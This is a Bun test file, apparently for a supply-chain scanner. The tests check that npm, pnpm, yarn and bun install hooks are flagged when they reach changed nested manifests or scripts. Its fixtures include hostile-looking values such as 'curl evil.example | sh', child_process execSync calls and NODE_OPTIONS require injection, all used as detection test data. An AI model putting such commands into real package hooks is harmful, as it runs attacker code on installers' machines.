import { describe, expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const SUB_OLD = { "sub/x.js": "1" };
const SUB_NEW = { "sub/x.js": "require('child_process').execSync('id')" };
const subManifest = (build: string) => ({ "sub/package.json": JSON.stringify({ name: "sub", version: "1", scripts: { build } }) });

// The hook names a runner form; only the given files change between old and new.
function held(scripts: object, oldFiles: Record<string, string>, newFiles: Record<string, string>): boolean {
  const base = { "package.json": pj(scripts) };
  return prepass("npm", map({ ...base, ...oldFiles }), map({ ...base, ...newFiles })).hard.some((s) => s.kind === "install-script");
}
const fileHeld = (hook: string) => held({ postinstall: hook, build: "echo ok", test: "echo ok" }, SUB_OLD, SUB_NEW);
const manifestHeld = (hook: string) => held({ postinstall: hook, build: "echo ok" }, subManifest("echo a"), subManifest("curl evil.example | sh"));

describe("a form that runs another package's script reads that package's manifest", () => {
  test("pnpm, yarn and bun workspace forms hold a changed script in another manifest", () => {
    for (const cmd of ["pnpm -C sub build", "pnpm --filter sub build", "pnpm -r build", "yarn workspace sub build", "yarn --cwd sub build", "bun --filter sub build", "bun run --workspaces build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("npm workspace forms and the wrapped forms hold it too", () => {
    for (const cmd of ["npm run build --prefix sub", "npm run build -w sub", "npx pnpm -C sub build", "corepack pnpm --filter sub build", "npx npm run build -w sub"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("a form that stays in this package ignores another manifest", () => {
    for (const cmd of ["npm run build", "pnpm run build", "yarn build", "bun run build", "npm run build -- --prefix sub"]) {
      expect(manifestHeld(cmd), cmd).toBe(false);
    }
  });
});

describe("npm forms that leave this package hold", () => {
  test("--prefix, -C, -w, --workspace and --workspaces do not resolve to the local script", () => {
    for (const cmd of ["npm run build --prefix sub", "npm --prefix sub run build", "npm --prefix=sub run build", "npm -C sub run build", "npm run build -w sub", "npm run build --workspace=sub", "npm run build -ws", "npm run build --workspaces", "npm test -w sub", "npm run -w sub build", "npm --workspace sub run build", "npm run build --include-workspace-root"]) {
      expect(fileHeld(cmd), cmd).toBe(true);
    }
  });

  test("a flag after -- belongs to the script, and a plain run stays local", () => {
    for (const cmd of ["npm run build", "npm run build -- -w sub", "npm test", "npm run build --silent"]) {
      expect(fileHeld(cmd), cmd).toBe(false);
    }
  });
});

describe("an unknown flag before the script name holds", () => {
  test("yarn, pnpm, bun and npm do not guess what a flag takes", () => {
    for (const cmd of ["yarn run -T build", "yarn -T build", "pnpm run --foo build", "pnpm --bar build", "pnpm run -T build", "bun run --bun build", "npm run --foo build", "yarn run -- build"]) {
      expect(fileHeld(cmd), cmd).toBe(true);
    }
  });

  test("known quiet flags still resolve to the local script", () => {
    for (const cmd of ["yarn run --silent build", "pnpm run --if-present build", "bun run build", "yarn build"]) {
      expect(fileHeld(cmd), cmd).toBe(false);
    }
  });
});

describe("review round: pinned runners, exec forms, unresolved routes and .npmrc", () => {
  test("a version-pinned wrapped runner is recognized", () => {
    for (const cmd of ["npx pnpm@9 -C sub build", "corepack yarn@1.22.22 workspace sub build", "npx pnpm@9 --filter sub build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("bunx, npm exec and npx -c reach the wrapped runner", () => {
    for (const cmd of ["bunx pnpm -C sub build", "npm exec -- pnpm -C sub build", "npx -c 'pnpm -C sub build'"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("every unresolved route reads the other manifests", () => {
    for (const cmd of ["cd sub && npm run build", "lerna run build", "npx lerna run build", "turbo run build", "npm_config_workspace=sub npm run build", "env npm_config_prefix=sub npm run build", "npm --userconfig ./rc run build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("a .npmrc in the package joins the surface and widens", () => {
    const scripts = { postinstall: "npm run build", build: "echo ok" };
    const oldF = { ".npmrc": "workspace=sub\n", ...subManifest("echo a") };
    expect(held(scripts, oldF, { ".npmrc": "workspace=sub\n", ...subManifest("curl evil.example | sh") })).toBe(true);
    expect(held(scripts, oldF, { ".npmrc": "workspace=other\n", ...subManifest("echo a") })).toBe(true);
    expect(held(scripts, subManifest("echo a"), subManifest("curl evil.example | sh"))).toBe(false);
  });
});

describe("a manifest under a test or docs folder is still read by a directory-changing form", () => {
  const nested = (dir: string, build: string) => ({ [`${dir}/package.json`]: JSON.stringify({ name: "n", version: "1", scripts: { build } }) });
  const cases: [string, string][] = [
    ["npm --prefix tests/pkg run build", "tests/pkg"],
    ["pnpm -C tests/pkg build", "tests/pkg"],
    ["yarn --cwd docs/pkg build", "docs/pkg"],
    ["npm run build -w test/pkg", "test/pkg"],
    ["cd __tests__/pkg && npm run build", "__tests__/pkg"],
  ];
  test("each form holds a changed nested manifest", () => {
    for (const [cmd, dir] of cases) {
      expect(held({ postinstall: cmd, build: "echo ok" }, nested(dir, "echo a"), nested(dir, "curl evil.example | sh")), cmd).toBe(true);
    }
  });
  test("the control under sub holds and an unchanged manifest does not", () => {
    expect(manifestHeld("npm --prefix sub run build")).toBe(true);
    expect(held({ postinstall: "npm --prefix tests/pkg run build", build: "echo ok" }, nested("tests/pkg", "echo a"), nested("tests/pkg", "echo a"))).toBe(false);
  });
});

describe("npm exec forms and runner config files", () => {
  test("npm exec and npm x hold a changed file the command reaches, remote or not", () => {
    for (const cmd of ["npm exec -- run-s setup", "npm x -- run-s setup", "npm exec -p evil-pkg -- node ./sub/x.js", "npm exec --package=evil-pkg -- node ./sub/x.js", "npm exec --call='node ./sub/x.js'", "npm exec -c='node ./sub/x.js'", "npm exec -c 'node ./sub/x.js'", "npm exec --call 'node ./sub/x.js'"]) {
      expect(held({ postinstall: cmd, setup: "node sub/x.js" }, SUB_OLD, SUB_NEW), cmd).toBe(true);
    }
  });

  test("npm exec with -c dispatches the call string to the wrapped runner", () => {
    for (const cmd of ["npm exec --call='pnpm -C sub build'", "npm exec -c='pnpm -C sub build'", "npm x -p pnpm -- pnpm -C sub build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("a changed runner config file with an install hook holds", () => {
    const scripts = { postinstall: "npm run build", build: "echo ok" };
    for (const f of [".npmrc", ".yarnrc.yml", ".yarnrc", "pnpm-workspace.yaml", ".pnpmfile.cjs", "bunfig.toml"]) {
      expect(held(scripts, { [f]: "a" }, { [f]: "b" }), f).toBe(true);
      expect(held(scripts, { [f]: "a" }, { [f]: "a" }), f).toBe(false);
      expect(held(scripts, {}, { [f]: "b" }), `added ${f}`).toBe(true);
    }
  });
});

describe("third review round", () => {
  test("npm flags after the script name, by prefix or joined, widen", () => {
    for (const cmd of ["npm run build --prefi sub", "npm run build --prefi=sub", "npm run build -sw sub", "npm test --userconf ./rc", "npm run build --script-shell=./x", "npm run build --node-options=--require=./x", "npx npm run build --prefi sub"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("known quiet npm flags and flags after -- stay local", () => {
    for (const cmd of ["npm run build --silent", "npm run build --loglevel silent", "npm run build --if-present", "npm run build -- --prefi sub"]) {
      expect(manifestHeld(cmd), cmd).toBe(false);
    }
  });

  test("npm exec -c runs the whole shell string", () => {
    for (const cmd of ["npm exec -c 'node ./safe.js && pnpm -C sub build'", "npm exec --call='node ./safe.js && pnpm -C sub build'"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("a runner spec that is not a version or tag is not the trusted runner", () => {
    for (const cmd of ["npx pnpm@file:pnpm.tgz build", "npx pnpm@npm:other-pkg build", "corepack pnpm@https://x.example/p.tgz build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
    for (const cmd of ["npx pnpm@9.1.0 build", "npx pnpm@latest build", "corepack pnpm@9.1.0+sha256.abc build"]) {
      expect(fileHeld(cmd), cmd).toBe(false);
    }
  });

  test("a body the splitter gives up on still widens when it moves the run", () => {
    for (const cmd of ["pnpm -C sub build > /dev/null", "npm run build -w sub | tee log", "(cd sub && npm run build)", "sh -c 'cd sub && npm run build'", "lerna run build --config ./lerna.json", "npx lerna run build --config ./lerna.json", "turbo run build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
    expect(manifestHeld("npm run build > /dev/null")).toBe(false);
  });

  test("an environment assignment widens only for runner configuration names", () => {
    expect(manifestHeld("npm_config_workspace=sub npm run build")).toBe(true);
    expect(manifestHeld("YARN_RC_FILENAME=x yarn build")).toBe(true);
    expect(manifestHeld("FOO=1 npm run build")).toBe(false);
  });

  test("a widened hook does not hold when only the root version bumps", () => {
    const hook = (version: string) => ({ "package.json": JSON.stringify({ name: "x", version, scripts: { postinstall: "lerna run build" } }), ...subManifest("echo a") });
    expect(prepass("npm", map(hook("1.0.0")), map(hook("1.0.1"))).hard.some((f) => f.kind === "install-script")).toBe(false);
  });
});

describe("a nested package's script file under a test or docs folder", () => {
  const pkg = JSON.stringify({ name: "n", version: "1", scripts: { build: "node build.js" } });
  const files = (dir: string, js: string) => ({ [`${dir}/package.json`]: pkg, [`${dir}/build.js`]: js });
  const forms: [string, string][] = [
    ["npm --prefix tests/pkg run build", "tests/pkg"],
    ["pnpm -C tests/pkg build", "tests/pkg"],
    ["yarn --cwd docs/pkg build", "docs/pkg"],
    ["npm -w test/pkg run build", "test/pkg"],
    ["cd __tests__/pkg && npm run build", "__tests__/pkg"],
    ["npm --prefix sub run build", "sub"],
  ];
  test("a changed script file there holds", () => {
    for (const [cmd, dir] of forms) {
      expect(held({ postinstall: cmd, build: "echo ok" }, files(dir, "1"), files(dir, "require('child_process').execSync('id')")), cmd).toBe(true);
    }
  });
  test("an unchanged one does not, and a folder with no nested manifest stays inert", () => {
    expect(held({ postinstall: "npm --prefix tests/pkg run build", build: "echo ok" }, files("tests/pkg", "1"), files("tests/pkg", "1"))).toBe(false);
    expect(held({ postinstall: "lerna run build", build: "echo ok" }, { "tests/helper.js": "1" }, { "tests/helper.js": "2" })).toBe(false);
  });
});

describe("fourth review round: escapes", () => {
  // sub/index.js exists, so the word `sub` resolves to a file; only the manifest build changes.
  const withIndex = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
  const idxHeld = (hook: string) => held({ postinstall: hook, build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh"));

  test("a cd or pushd always widens, even when its target resolves to a file", () => {
    for (const cmd of ["cd sub && npm run build", "pushd sub && npm run build", "cd sub; yarn build", "command cd sub && npm run build", "builtin cd sub && npm run build"]) {
      expect(idxHeld(cmd), cmd).toBe(true);
    }
  });

  test("an unresolvable expansion in a body that moves the run widens", () => {
    for (const cmd of ["npm run build --prefix $PWD/sub", "cd $PWD/sub && npm run build", "pnpm -C ${INIT_CWD}/sub build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
    expect(manifestHeld("npm run build $FOO")).toBe(false);
  });

  test("every leading assignment is checked", () => {
    for (const cmd of ["CI=1 npm_config_workspace=sub npm run build", "A=1 B=2 YARN_RC_FILENAME=x yarn build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("unknown npm flags, shell options and a backslash do not hide the move", () => {
    for (const cmd of ["npm run build --prefi sub > /dev/null", "sh -c 'npm run build --prefi sub'", "bash --norc -c 'cd sub && npm run build'", "sh -e -c 'cd sub && npm run build'", "\\cd sub > /dev/null && npm run build", "corepack npm run build --prefi sub"]) {
      expect(idxHeld(cmd), cmd).toBe(true);
    }
    expect(idxHeld("npm run build > /dev/null")).toBe(false);
  });
});

describe("fifth review round: false positives and the npm exec parser", () => {
  const lib = (v: string) => ({ "lib/a.js": v });
  const quiet = (scripts: object, extra: Record<string, string> = {}) => held(scripts, { ...extra, ...lib("1") }, { ...extra, ...lib("2") });

  test("a config file below the root, or a hook with no runner, does not widen", () => {
    expect(quiet({ postinstall: "node install.js" }, { "templates/app/.yarnrc.yml": "a", "test/fixtures/p/.npmrc": "a", "bunfig.toml": "a" })).toBe(false);
    expect(quiet({ install: "node-gyp-build" }, { ".yarnrc": "a" })).toBe(false);
    expect(held({ postinstall: "npm run build", build: "echo ok" }, { "test/fixtures/p/.npmrc": "a" }, { "test/fixtures/p/.npmrc": "b" })).toBe(false);
  });

  test("a root config file with a runner in the hook still widens", () => {
    expect(quiet({ postinstall: "npm run build", build: "echo ok" }, { ".npmrc": "a" })).toBe(true);
  });

  test("another program's flags, quoted text and echo do not move the run", () => {
    for (const cmd of ["rm -rf build 2>/dev/null; node install.js", "prebuild-install -r napi 2>/dev/null || node-gyp rebuild", "tar -C vendor -xf v.tgz > /dev/null && node install.js", "node install.js || echo 'workspace setup failed' >&2"]) {
      expect(quiet({ postinstall: cmd }), cmd).toBe(false);
    }
  });

  test("a runner command word with a workspace flag still moves the run, in any segment", () => {
    for (const cmd of ["echo hi 2>/dev/null; pnpm -r build > /dev/null", "npm run build -w sub | tee log", "true && cd sub > /dev/null"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("npm exec options are parsed by the exec reader, not the plain flag rule", () => {
    // sub/index.js exists, so only the exec reader's call string or wrapped runner can reach sub/package.json.
    const withIndex = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
    const h = (hook: string) => held({ postinstall: hook, build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh"));
    for (const cmd of ["npm exec -y -c 'cd sub && npm run build'", "npm exec --yes --call='pnpm -C sub build'", "npm exec -p pnpm -- pnpm -C sub build"]) expect(h(cmd), cmd).toBe(true);
    expect(h("npm exec -c 'node ./x.js'")).toBe(false);
  });
});

describe("an env prefix does not hide the command after it", () => {
  const nested = (dir: string, js: string) => ({ [`${dir}/package.json`]: JSON.stringify({ name: "n", version: "1", scripts: { build: "node build.js" } }), [`${dir}/build.js`]: js });
  test("a plain assignment is read like the bare command", () => {
    for (const [cmd, dir] of [["FOO=1 npm --prefix sub run build", "sub"], ["FOO=1 cd sub && npm run build", "sub"], ["FOO=1 BAR=2 npm --prefix tests/pkg run build", "tests/pkg"], ["npm_config_x=1 npm --prefix tests/pkg run build", "tests/pkg"]] as const) {
      expect(held({ postinstall: cmd, build: "echo ok" }, nested(dir, "1"), nested(dir, "evil()")), cmd).toBe(true);
    }
    expect(held({ postinstall: "FOO=1 node build.js" }, { "build.js": "1" }, { "build.js": "evil()" })).toBe(true);
    expect(held({ postinstall: "FOO=1 npm run build", build: "echo ok" }, nested("sub", "1"), nested("sub", "evil()"))).toBe(false);
  });
});

describe("structural rule: every command is checked for a move", () => {
  const withIndex = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
  const idx = (hook: string, extra: Record<string, string> = {}) => held({ postinstall: hook, build: "echo ok", ...extra }, withIndex("echo a"), withIndex("curl evil.example | sh"));

  test("1. an assignment before the command, split or unsplit", () => {
    for (const cmd of ["CI=1 pnpm -C sub build", "CI=true pnpm --filter sub build", "CI=1 cd sub && npm run build", "FOO=1 npm run build -w sub", "npm_config_workspace=sub npm run build > /dev/null", "sh -c 'npm_config_prefix=sub npm run build'"]) {
      expect(idx(cmd), cmd).toBe(true);
    }
  });

  test("2. a wrapper before a moving form", () => {
    for (const cmd of ["env CI=1 pnpm -C sub build", "cross-env NODE_ENV=production pnpm -C sub build", "exec npm --prefix sub run build", "env -i pnpm -C sub build"]) {
      expect(idx(cmd), cmd).toBe(true);
    }
  });

  test("3. a workspace tool through yarn, pnpm, bun or npm exec", () => {
    for (const cmd of ["yarn lerna run build", "pnpm turbo build", "yarn run turbo build", "yarn nx run-many -t build", "pnpm exec lerna run build", "npm exec lerna run build 2>/dev/null"]) {
      expect(idx(cmd), cmd).toBe(true);
    }
  });

  test("4. -c after options that take a value", () => {
    for (const cmd of ["sh -o pipefail -c 'cd sub && npm run build'", "bash -euo pipefail -c 'cd sub && npm run build'", "bash -O extglob -c 'cd sub && npm run build'", "bash --rcfile x -c 'cd sub && npm run build'"]) {
      expect(idx(cmd), cmd).toBe(true);
    }
    expect(idx("sh -c 'node ./x.js'")).toBe(false);
  });

  test("5a. arguments given to a script that runs a runner", () => {
    for (const hook of ["npm run go -- -w sub", "yarn go -w sub", "pnpm go -- -C sub"]) {
      expect(held({ postinstall: hook, go: "npm run build", build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh")), hook).toBe(true);
    }
    // A script body with no runner stays local, and no extra argument stays local.
    expect(held({ postinstall: "npm run go -- -w sub", go: "echo hi", build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh"))).toBe(false);
    expect(held({ postinstall: "npm run go", go: "npm run build", build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh"))).toBe(false);
  });

  test("5b. files under a directory a run moved into are read, even test or docs", () => {
    for (const cmd of ["cd test && node setup.js", "pnpm -C docs exec node gen.js", "npm --prefix test run setup"]) {
      const dir = cmd.includes("docs") ? "docs" : "test";
      expect(held({ postinstall: cmd }, { [`${dir}/setup.js`]: "1", [`${dir}/gen.js`]: "1" }, { [`${dir}/setup.js`]: "evil()", [`${dir}/gen.js`]: "evil()" }), cmd).toBe(true);
    }
    expect(held({ postinstall: "lerna run build" }, { "test/helper.js": "1" }, { "test/helper.js": "2" })).toBe(false);
  });

  test("5c. a runner reached through a shell script makes the root config count", () => {
    const hook = { postinstall: "sh scripts/prep.sh" };
    const f = (cfg: string) => ({ "scripts/prep.sh": "npm run build\n", ".npmrc": cfg });
    expect(held(hook, f("workspace=a"), f("workspace=b"))).toBe(true);
    const g = (cfg: string) => ({ "scripts/prep.sh": "echo hi\n", ".npmrc": cfg });
    expect(held(hook, g("workspace=a"), g("workspace=b"))).toBe(false);
  });
});

describe("npm exec -p and NODE_ assignments", () => {
  const h = (hook: string, files: Record<string, string> = {}) => held({ postinstall: hook, build: "echo ok" }, { ...files, ...subManifest("echo a"), "lib/a.js": "1" }, { ...files, ...subManifest("echo a"), "lib/a.js": "2" });
  test("-p pkg with -c or -- widens, and -c alone stays on the call string", () => {
    expect(h("npm exec -p evil-pkg -c 'node ./safe.js'", { "safe.js": "s" })).toBe(true);
    expect(h("npm exec -p evil-pkg -- node ./safe.js", { "safe.js": "s" })).toBe(true);
    expect(h("npm exec -c 'node ./safe.js'", { "safe.js": "s" })).toBe(false);
  });
  test("NODE_OPTIONS widens, another NODE_ name does not", () => {
    expect(h("NODE_OPTIONS=--require=./sub/x.js npm run build")).toBe(true);
    expect(h("NODE_ENV=production npm run build")).toBe(false);
  });
});

describe("5c: a runner reached through a shell script", () => {
  test("a root .npmrc added with a changed nested script holds; without a runner it does not", () => {
    const hook = { postinstall: "sh scripts/prep.sh", build: "echo ok" };
    const oldF = (sh: string) => ({ "scripts/prep.sh": sh, ...subManifest("echo a") });
    const newF = (sh: string) => ({ "scripts/prep.sh": sh, ".npmrc": "workspace=sub\n", ...subManifest("curl evil.example | sh") });
    expect(held(hook, oldF("npm run build\n"), newF("npm run build\n"))).toBe(true);
    expect(held(hook, oldF("node setup.js\n"), newF("node setup.js\n"))).toBe(false);
  });
});

describe("unmodeled command words and wrappers with value options", () => {
  const withIndex = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
  const idx = (hook: string, extra: Record<string, string> = {}) => held({ postinstall: hook, build: "echo ok", ...extra }, withIndex("echo a"), withIndex("curl evil.example | sh"));

  test("1. wrapper options that take a value", () => {
    for (const cmd of ["env -u NODE_ENV pnpm -C sub build", "env -C sub npm run build", "env -S 'pnpm -C sub build'", "time -o t.log npm --prefix sub run build", "exec -a x pnpm -C sub build"]) {
      expect(idx(cmd), cmd).toBe(true);
    }
  });

  test("2. commands that run their arguments, and reserved words", () => {
    for (const cmd of ["nice pnpm -C sub build", "timeout 60 npm --prefix sub run build", "eval cd sub && npm run build", "eval 'cd sub && npm run build'", "! cd sub || npm run build", "echo sub | xargs -I% npm --prefix % run build"]) {
      expect(idx(cmd), cmd).toBe(true);
    }
  });

  test("3. options after -c, and a script piped into a shell", () => {
    for (const cmd of ["sh -c -e 'cd sub && npm run build'", "bash -c -- 'cd sub && npm run build'", "sh -c -o pipefail 'cd sub && npm run build'", "echo 'cd sub && npm run build' | sh"]) {
      expect(idx(cmd), cmd).toBe(true);
    }
    expect(idx("echo 'node ./x.js' | sh", { "x.js": "1" })).toBe(false);
  });

  test("4. script arguments through npx, corepack, env and yarn/pnpm wrappers", () => {
    for (const hook of ["npx npm run go -- -w sub", "corepack npm run go -- -w sub", "npx yarn go -w sub", "npx pnpm go -- -C sub", "env npm run go -- -w sub"]) {
      expect(held({ postinstall: hook, go: "npm run build", build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh")), hook).toBe(true);
    }
  });
});

describe("unsplit bodies: runners, moved directories, escapes and comments", () => {
  const withIndex = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
  const idx = (hook: string, extra: Record<string, string> = {}) => held({ postinstall: hook, build: "echo ok" }, { ...withIndex("echo a"), ...extra }, { ...withIndex("curl evil.example | sh"), ...extra });

  test("1. a runner in a body the splitter gives up on makes the root config count", () => {
    const hook = { postinstall: "npm run build > /dev/null", build: "echo ok" };
    expect(held(hook, { ".npmrc": "workspace=a" }, { ".npmrc": "workspace=b" })).toBe(true);
    expect(held({ postinstall: "npm run build --prefix $PWD/x", build: "echo ok" }, { ".npmrc": "a" }, { ".npmrc": "b" })).toBe(true);
    expect(held({ postinstall: "node a.js > /dev/null" }, { ".npmrc": "a", "a.js": "1" }, { ".npmrc": "b", "a.js": "1" })).toBe(false);
  });

  test("2. a directory an unsplit body moves into is read, even test or docs", () => {
    for (const cmd of ["cd test > /dev/null && node setup.js", "pushd docs > /dev/null; node setup.js"]) {
      const dir = cmd.includes("docs") ? "docs" : "test";
      expect(held({ postinstall: cmd }, { [`${dir}/setup.js`]: "1" }, { [`${dir}/setup.js`]: "evil()" }), cmd).toBe(true);
    }
  });

  test("3. a backslash or a comment does not hide a later cd", () => {
    for (const cmd of ["node a.js > /dev/null # don't\ncd sub && npm run build", "echo \\\" > /dev/null; cd sub && npm run build", "echo \" > /dev/null; cd sub && npm run build"]) {
      expect(idx(cmd, { "a.js": "1" }), cmd).toBe(true);
    }
    // A comment is not a command.
    expect(idx("node a.js > /dev/null # cd sub && npm run build", { "a.js": "1" })).toBe(false);
  });
});

describe("joined env directory flags, clustered shell options, substitutions, relative cd and aliases", () => {
  const dirHeld = (cmd: string, dir: string, files: Record<string, string> = {}) => held({ postinstall: cmd }, { [`${dir}/setup.js`]: "1", [`${dir}/gen.js`]: "1", ...files }, { [`${dir}/setup.js`]: "evil()", [`${dir}/gen.js`]: "evil()", ...files });

  test("env -Cdir and --chdir=dir record the directory", () => {
    expect(dirHeld("env -Ctest node setup.js", "test")).toBe(true);
    expect(dirHeld("env --chdir=test node setup.js", "test")).toBe(true);
    expect(dirHeld("env -C test node setup.js", "test")).toBe(true);
  });

  test("a cluster ending in o takes its option name before the string", () => {
    expect(dirHeld("bash -eco pipefail 'cd test && node setup.js'", "test")).toBe(true);
  });

  test("a command substitution inside quotes runs its content", () => {
    expect(dirHeld('echo "$(cd test && node setup.js)"', "test")).toBe(true);
    expect(dirHeld('echo "`cd test && node setup.js`"', "test")).toBe(true);
  });

  test("a relative cd chain resolves against the earlier cd", () => {
    expect(dirHeld("cd tools > /dev/null && cd ../docs > /dev/null && node gen.js", "docs", { "tools/x": "1" })).toBe(true);
    expect(dirHeld("cd tools && cd ../docs && node gen.js", "docs", { "tools/x": "1" })).toBe(true);
  });

  test("yarnpkg and pnpx are yarn and npx", () => {
    const m = (cmd: string) => manifestHeld(cmd);
    expect(m("yarnpkg --cwd sub build")).toBe(true);
    expect(m("pnpx pnpm -C sub build")).toBe(true);
  });
});

describe("round 10: linear substitutions, clustered o, wrong cd base, clustered env -C", () => {
  const dirHeld = (cmd: string, dir: string, extra: Record<string, string> = {}, scripts: object = {}) => held({ postinstall: cmd, ...scripts }, { [`${dir}/setup.js`]: "1", [`${dir}/gen.js`]: "1", ...extra }, { [`${dir}/setup.js`]: "evil()", [`${dir}/gen.js`]: "evil()", ...extra });

  test("1. many substitutions are read in linear time", () => {
    const hook = `true "${"$(a) ".repeat(60)}x"`;
    const t = Date.now();
    held({ postinstall: hook }, {}, {});
    expect(Date.now() - t).toBeLessThan(10000);
    const nested = `true "${"$(a ".repeat(30)}${")".repeat(30)}"`;
    const t2 = Date.now();
    held({ postinstall: nested }, {}, {});
    expect(Date.now() - t2).toBeLessThan(10000);
  });

  test("2. o anywhere in a -c cluster takes an option name", () => {
    for (const cmd of ["bash -oc pipefail 'cd test && node setup.js'", "bash -eoc pipefail 'cd test && node setup.js'", "bash -ocu pipefail 'cd test && node setup.js'"]) {
      expect(dirHeld(cmd, "test"), cmd).toBe(true);
    }
  });

  test("3. a cd base from another script, subshell or popd does not hide the real folder", () => {
    expect(dirHeld("npm run a && npm run b", "docs", {}, { a: "cd tools && node x.js", b: "cd docs && node gen.js" })).toBe(true);
    expect(dirHeld("(cd test && node a.js); cd docs && node gen.js", "docs", { "test/a.js": "1" })).toBe(true);
    expect(dirHeld("pushd tools; popd; cd docs && node gen.js", "docs")).toBe(true);
  });

  test("4/5. clustered env -C, and an escaped backtick does not shift the substitutions", () => {
    expect(dirHeld("env -iCtest node setup.js", "test")).toBe(true);
    expect(dirHeld("env -iC test node setup.js", "test")).toBe(true);
    expect(dirHeld('echo "\\`" "`cd test && node setup.js`"', "test")).toBe(true);
  });
});

describe("round 11: fail closed when the shell scan cannot be sure", () => {
  const testHeld = (cmd: string) => held({ postinstall: cmd }, { "test/setup.js": "1" }, { "test/setup.js": "evil()" });

  test("1. quotes and case inside a substitution do not hide the cd", () => {
    for (const cmd of [
      `echo "$(echo ')'; cd test && node setup.js)" > /dev/null`,
      "echo '`' \"`cd test && node setup.js`\" > /dev/null",
      `echo "$(case a in a) cd test && node setup.js;; esac)" > /dev/null`,
    ]) {
      expect(testHeld(cmd), cmd).toBe(true);
    }
  });

  test("2. env -S in an unsplit body", () => {
    for (const cmd of ["env -S 'cd test && node setup.js' > /dev/null", "env --split-string='cd test && node setup.js' > /dev/null", "env -iS 'cd test && node setup.js' > /dev/null"]) {
      expect(testHeld(cmd), cmd).toBe(true);
    }
  });

  test("3. o before and after -c follow one rule", () => {
    for (const cmd of ["bash -c -oe pipefail 'cd test && node setup.js'", "bash -c -o pipefail 'cd test && node setup.js'", "bash -oc pipefail 'cd test && node setup.js'"]) {
      expect(testHeld(cmd), cmd).toBe(true);
    }
  });

  test("4. deep nesting stays within a budget and widens", () => {
    const hook = `echo "${"$(".repeat(20000)}${")".repeat(20000)}"`;
    const t = Date.now();
    expect(testHeld(hook)).toBe(true);
    expect(Date.now() - t).toBeLessThan(20000);
  });

  test("5. a long run of pipes into a shell stays linear", () => {
    const hook = "echo 'a b' | sh; ".repeat(2000);
    const t = Date.now();
    held({ postinstall: hook }, {}, {});
    expect(Date.now() - t).toBeLessThan(20000);
  });
});

describe("round 11b: unclosed substitutions and nested escaped backticks", () => {
  const pkgHeld = (cmd: string) => held({ postinstall: cmd }, { "tests/pkg/build.js": "1" }, { "tests/pkg/build.js": "evil()" });
  const timed = (cmd: string) => {
    const t = Date.now();
    const r = pkgHeld(cmd);
    expect(Date.now() - t).toBeLessThan(20000);
    return r;
  };

  test("an unclosed substitution in a long hook widens quickly", () => {
    expect(timed(`${"$(".repeat(5000)} cd tests/pkg && node build.js`)).toBe(true);
    expect(timed(`${'echo "$(" '.repeat(5000)} cd tests/pkg && node build.js`)).toBe(true);
    expect(timed(`${"$(".repeat(2000)}${")".repeat(2000)}`)).toBe(true);
  });

  test("an escaped backtick inside a backtick body widens", () => {
    expect(pkgHeld("echo `echo \\`cd tests/pkg && node build.js\\``")).toBe(true);
  });
});

describe("round 12: unresolvable cd targets, npm exec flags after the command, bounded recursion, CDPATH", () => {
  const testHeld = (cmd: string, extra: Record<string, string> = {}) => held({ postinstall: cmd }, { "test/setup.js": "1", ...extra }, { "test/setup.js": "evil()", ...extra });

  test("1. a cd target with an expansion, glob or brace reads every file", () => {
    for (const cmd of ["cd $PWD/test && node setup.js", "cd te* && node setup.js", "cd ${D:-test} && node setup.js", "cd $(echo test) && node setup.js", "pushd te?t && node setup.js", "cd {test,x} && node setup.js", "cd - && node setup.js"]) {
      expect(testHeld(cmd), cmd).toBe(true);
    }
    expect(testHeld("cd lib && node setup.js", { "lib/setup.js": "1" })).toBe(false);
  });

  test("2. npm flags after the exec command word are npm's own", () => {
    const f = (v: string) => ({ "tools/x.js": "1", "sub/lib/y.js": v, ...subManifest("echo a") });
    const h = (cmd: string) => held({ postinstall: cmd }, f("1"), f("evil()"));
    expect(h("npm exec ./tools/x.js -w sub")).toBe(true);
    expect(h("npm exec ./tools/x.js --prefix sub")).toBe(true);
  });

  test("3. deep wrapper recursion widens instead of crashing", () => {
    for (const hook of ["npx ".repeat(20000) + "x", "pnpm exec ".repeat(20000) + "x", "npm exec ".repeat(20000)]) {
      const t = Date.now();
      expect(testHeld(hook), hook.slice(0, 12)).toBe(true);
      expect(Date.now() - t).toBeLessThan(30000);
    }
  });

  test("3b. a long wrapper chain is read without crashing", () => {
    const t = Date.now();
    held({ postinstall: "env ".repeat(20000) + "x" }, {}, {});
    held({ postinstall: "sh -c ".repeat(5000) + "x" }, {}, {});
    expect(Date.now() - t).toBeLessThan(30000);
  });

  test("3c. thousands of directory changes are bounded and read every file", () => {
    for (const hook of ["cd x && ".repeat(20000) + "node a.js", "cd x > /dev/null && ".repeat(20000) + "node a.js"]) {
      const t = Date.now();
      expect(testHeld(hook, { "a.js": "1" })).toBe(true);
      expect(Date.now() - t).toBeLessThan(30000);
    }
  });

